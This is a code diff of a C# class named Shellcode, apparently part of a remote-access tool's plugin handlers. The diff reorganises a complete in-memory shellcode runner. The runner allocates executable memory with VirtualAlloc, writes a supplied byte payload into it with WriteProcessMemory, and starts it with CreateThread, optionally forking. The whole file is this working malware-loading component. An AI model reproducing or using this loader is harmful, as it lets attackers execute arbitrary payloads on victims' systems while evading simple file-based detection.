@@ -1,76 +1,10 @@
-﻿using Plugin;
-using MessagePackLib.MessagePack;
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
-using System.Linq;
-using System.Management;
-using System.Text;
-using System.Threading;
+﻿using System;
 using System.Runtime.InteropServices;
-using System.ComponentModel;
 
 namespace Miscellaneous.Handler
 {
-    class Shellcode
+    internal class Shellcode
     {
-        public static void Run(byte[] shellcode, bool fork)
-        {
-            if (shellcode.Length == 0)
-                throw new Exception("Shellcode is empty!");
-
-            IntPtr pMem = VirtualAlloc(UIntPtr.Zero, shellcode.Length,
-                AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
-
-            if (pMem == IntPtr.Zero || Marshal.GetLastWin32Error() != 0)
-                throw new Exception("Unable to allocate memory region.");
-
-            try
-            {
-                //Marshal.Copy(shellcode, 0, pMem, shellcode.Length);
-                IntPtr dwBytes = IntPtr.Zero;
-                WriteProcessMemory(GetCurrentProcess(), pMem, shellcode, shellcode.Length, out dwBytes);
-
-                UInt32 dwThreadId = 0;
-                UIntPtr hThread = CreateThread(UIntPtr.Zero, 0, pMem, IntPtr.Zero, 0, ref dwThreadId);
-
-                if (hThread == UIntPtr.Zero)
-                    throw new Exception("Unable to create thread for shellcode.");
-
-                if (!fork)
-                    WaitForSingleObject(hThread, 0xFFFFFFFF);
-            }
-            finally
-            {
-                if (!fork)
-                    VirtualFree(pMem, shellcode.Length, AllocationType.Release);
-            }
-
-        }
-
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GetCurrentProcess();
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr VirtualAlloc(UIntPtr lpAddress, int dwSize,
-            AllocationType flAllocationType, MemoryProtection flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool VirtualFree(IntPtr lpAddress, int dwSize, AllocationType dwFreeType);
-
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
-            byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport("kernel32")]
-        private static extern UIntPtr CreateThread(UIntPtr lpThreadAttributes, UInt32 dwStackSize,
-            IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
-
-        [DllImport("kernel32")]
-        private static extern UInt32 WaitForSingleObject(UIntPtr hHandle, UInt32 dwMilliseconds);
-
         [Flags]
         public enum AllocationType
         {
@@ -100,5 +34,60 @@ namespace Miscellaneous.Handler
             NoCacheModifierflag = 0x200,
             WriteCombineModifierflag = 0x400
         }
+
+        public static void Run(byte[] shellcode, bool fork)
+        {
+            if (shellcode.Length == 0)
+                throw new Exception("Shellcode is empty!");
+
+            var pMem = VirtualAlloc(UIntPtr.Zero, shellcode.Length,
+                AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+
+            if (pMem == IntPtr.Zero || Marshal.GetLastWin32Error() != 0)
+                throw new Exception("Unable to allocate memory region.");
+
+            try
+            {
+                //Marshal.Copy(shellcode, 0, pMem, shellcode.Length);
+                var dwBytes = IntPtr.Zero;
+                WriteProcessMemory(GetCurrentProcess(), pMem, shellcode, shellcode.Length, out dwBytes);
+
+                uint dwThreadId = 0;
+                var hThread = CreateThread(UIntPtr.Zero, 0, pMem, IntPtr.Zero, 0, ref dwThreadId);
+
+                if (hThread == UIntPtr.Zero)
+                    throw new Exception("Unable to create thread for shellcode.");
+
+                if (!fork)
+                    WaitForSingleObject(hThread, 0xFFFFFFFF);
+            }
+            finally
+            {
+                if (!fork)
+                    VirtualFree(pMem, shellcode.Length, AllocationType.Release);
+            }
+        }
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr VirtualAlloc(UIntPtr lpAddress, int dwSize,
+            AllocationType flAllocationType, MemoryProtection flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualFree(IntPtr lpAddress, int dwSize, AllocationType dwFreeType);
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+            byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32")]
+        private static extern UIntPtr CreateThread(UIntPtr lpThreadAttributes, uint dwStackSize,
+            IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);
+
+        [DllImport("kernel32")]
+        private static extern uint WaitForSingleObject(UIntPtr hHandle, uint dwMilliseconds);
     }
 }
